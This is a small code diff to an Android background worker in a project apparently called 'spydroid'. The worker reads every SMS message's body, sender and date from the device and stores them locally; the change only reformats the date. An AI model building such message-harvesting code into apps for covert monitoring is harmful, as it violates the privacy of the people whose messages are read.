@@ -22,6 +22,7 @@ import android.content.ContentResolver
 import android.content.Context
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.icu.text.SimpleDateFormat
 import android.net.Uri
 import android.provider.Telephony
 import android.util.Log
@@ -32,6 +33,8 @@ import net.spydroid.common.local.LocalDataProvider
 import net.spydroid.common.local.models.CurrentSms
 import net.spydroid.feature.sms.local.domain.SmsRepository
 import net.spydroid.feature.sms.local.models.SmsHandler
+import java.util.Date
+import java.util.Locale
 import javax.inject.Inject
 class SmsWork(private val context: Context, workerParams: WorkerParameters) :
     Worker(context, workerParams) {
@@ -41,11 +44,9 @@ class SmsWork(private val context: Context, workerParams: WorkerParameters) :
 
     override fun doWork(): Result {
         try {
-
-            val smsList = mutableListOf<SmsHandler>()
             val uri: Uri = Telephony.Sms.CONTENT_URI
-
             val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
+
             cursor?.use {
                 val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
                 val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
@@ -55,11 +56,16 @@ class SmsWork(private val context: Context, workerParams: WorkerParameters) :
                     val body = it.getString(indexBody)
                     val address = it.getString(indexAddress)
                     val date = it.getLong(indexDate)
+
+                    val dateSent = Date(date)
+                    val format = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
+                    val dateSentFormatted = format.format(dateSent)
+
                     localDataProvider.setSmsCurrent(
                         CurrentSms(
                             address = address,
                             body = body,
-                            date = date.toString()
+                            date = dateSentFormatted
                         )
                     )
                 }
